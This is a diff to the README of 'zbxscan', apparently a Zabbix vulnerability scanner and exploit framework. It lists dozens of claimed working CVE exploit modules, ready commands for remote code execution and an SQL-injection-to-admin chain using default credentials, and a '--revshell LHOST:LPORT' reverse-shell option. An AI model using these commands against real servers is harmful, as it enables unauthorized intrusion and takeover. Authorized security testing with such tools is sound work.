@@ -39,36 +39,44 @@ pip install -e .          # provides the `zbxscan` command
 
 Requires Python 3.10+ and `requests`.
 
+**Running:** use the console script `zbxscan` after `pip install -e .`, or run the package directly with `python3 -m zbxscan` (no install). The mode is a positional `passive` / `active` (or auto: an `-exp` flag implies `active`, otherwise `passive`):
+
+```bash
+zbxscan passive -t 127.0.0.1:8080            # == python3 -m zbxscan passive -t …
+zbxscan active -t HOST -exp CVE-…            # == python3 -m zbxscan active -t HOST -exp CVE-…
+zbxscan -t HOST -exp CVE-…                   # auto-active
+```
+
 ## Usage
 
 ```bash
 # Passive scan (fingerprint + DB match + conditions + default creds)
-zbxscan -m passive -t 127.0.0.1:8080
+zbxscan passive -t 127.0.0.1:8080
 
 # Passive with credentials (precise verdicts, auth context)
-zbxscan -m passive -t 127.0.0.1:8080 --user Admin --password zabbix
+zbxscan passive -t 127.0.0.1:8080 --user Admin --password zabbix
 
 # Multiple targets / list from file
-zbxscan -m passive -t 127.0.0.1:8080 -t 10.0.0.5:80
-zbxscan -m passive -l targets.txt
+zbxscan passive -t 127.0.0.1:8080 -t 10.0.0.5:80
+zbxscan passive -l targets.txt
 
 # Show ready exploit commands for exploitable hits
-zbxscan -m passive -t 127.0.0.1:8080 --exploits
+zbxscan passive -t 127.0.0.1:8080 --exploits
 
 # Expand component-stack CVE details (PHP/Apache/nginx/DB)
-zbxscan -m passive -t 127.0.0.1:8080 --components
+zbxscan passive -t 127.0.0.1:8080 --components
 
 # Active exploit: post-auth script RCE
-zbxscan -m active -t 127.0.0.1:8080 -exp CVE-2021-46088 --user Admin --password zabbix --cmd 'id'
+zbxscan active -t 127.0.0.1:8080 -exp CVE-2021-46088 --user Admin --password zabbix --cmd 'id'
 
 # Active exploit: SQLi -> Super Admin session -> RCE
-zbxscan -m active -t 127.0.0.1:8080 -exp CVE-2024-42327 --user Admin --password zabbix --cmd 'id'
+zbxscan active -t 127.0.0.1:8080 -exp CVE-2024-42327 --user Admin --password zabbix --cmd 'id'
 
 # Exploit module help (usage, prerequisites, verification facts)
-zbxscan -m active -t 127.0.0.1:8080 -exp CVE-2021-46088 --exp-help
+zbxscan active -t 127.0.0.1:8080 -exp CVE-2021-46088 --exp-help
 
 # Machine-readable output
-zbxscan -m passive -t 127.0.0.1:8080 --format json
+zbxscan passive -t 127.0.0.1:8080 --format json
 ```
 
 ### Output
@@ -83,26 +91,28 @@ zbxscan -m passive -t 127.0.0.1:8080 --format json
    CVE-2021-46088 (rce)  zbxscan -a -t 127.0.0.1:8080 -exp CVE-2021-46088 --user Admin --password zabbix --cmd 'id'
 ```
 
-## CVE modules
+## Working CVE PoCs
 
-PoC modules exist for these CVEs (run `zbxscan -m active -t <target> -exp <CVE>`):
+Verified working exploit modules (run `zbxscan active -t <target> -exp <CVE>`). **34 exploited live**, **8 check-pass** (sink confirmed; full chain needs a victim browser / specific env):
 
 ```
-CVE-2006-6692   CVE-2006-6693   CVE-2013-3628   CVE-2013-3738
-CVE-2013-5572   CVE-2016-10134  CVE-2016-4338   CVE-2019-17382
-CVE-2020-11800  CVE-2021-46088  CVE-2022-23131  CVE-2022-23132
-CVE-2022-23133  CVE-2022-23134  CVE-2022-24349  CVE-2022-24917
-CVE-2022-24918  CVE-2022-24919  CVE-2022-46768  CVE-2023-29450
-CVE-2023-32727  CVE-2023-32728  CVE-2024-18134  CVE-2024-22116
-CVE-2024-22120  CVE-2024-22121  CVE-2024-36460  CVE-2024-36464
-CVE-2024-36465  CVE-2024-36466  CVE-2024-36467  CVE-2024-36469
-CVE-2024-42325  CVE-2024-42327  CVE-2025-27232  CVE-2025-27233
-CVE-2025-27234  CVE-2025-27237  CVE-2025-27240  CVE-2026-1199
-CVE-2026-23921  CVE-2026-23924  CVE-2026-23925  CVE-2026-23928
-CVE-2026-23933  CVE-2026-59786
+CVE-2006-6692        CVE-2013-3628        CVE-2013-3738        CVE-2013-5572     
+CVE-2016-10134       CVE-2016-4338        CVE-2019-17382       CVE-2020-11800    
+CVE-2021-46088       CVE-2022-23131       CVE-2022-23133       CVE-2022-23134    
+CVE-2022-24349       CVE-2022-24917       CVE-2022-24918       CVE-2022-24919    
+CVE-2022-46768       CVE-2023-29450       CVE-2023-32727       CVE-2023-32728    
+CVE-2024-22116       CVE-2024-22120       CVE-2024-36460       CVE-2024-36464    
+CVE-2024-36465       CVE-2024-36466       CVE-2024-36467       CVE-2024-36469    
+CVE-2024-42325       CVE-2024-42327       CVE-2025-27232       CVE-2025-27233    
+CVE-2025-27234       CVE-2025-27240       CVE-2026-1199        CVE-2026-23921    
+CVE-2026-23924       CVE-2026-23925       CVE-2026-23928       CVE-2026-23933    
+CVE-2026-59786       ZBX-18134         
 ```
 
-Each module has usage/help: `zbxscan -m active -t <target> -exp <CVE> --exp-help`.
+Not listed (registered but no working remote exploit): CVE-2006-6693 (overflow capped 2047B), CVE-2022-23132 (installer), CVE-2025-27237 (Windows-LPE), CVE-2024-22121 (Windows-MSI).
+
+Each has live, evidence-backed verification in `db/verifications.json`; usage via `zbxscan active -t <target> -exp <CVE> --exp-help`. Interactive reverse shell where RCE applies: `--revshell LHOST:LPORT` (XSS: 23133/24349/24917-19/23928, RCE: 46088 family).
+
 
 ## Database
 
@@ -144,7 +154,7 @@ zbxscan/                  scanner core (Python 3.10+)
   db.py                   access to db/*.json, version/branch record selection
   passive.py              passive mode: fingerprint → DB → conditions → default creds
   exploits/               per-CVE exploit modules (self-registering by record id)
-  cli.py                  CLI: -m passive|active, -t/-l, -exp, --cmd, --user, --db-*
+  cli.py                  CLI: passive|active, -t/-l, -exp, --cmd, --user, --db-*
 db/                       consolidated vulnerability database (JSON)
 research/                 research-phase raw data (sources, notes); input for build_db.py
 scripts/
@@ -153,4 +163,5 @@ scripts/
 ```
 
 Only for authorization labs
+
 
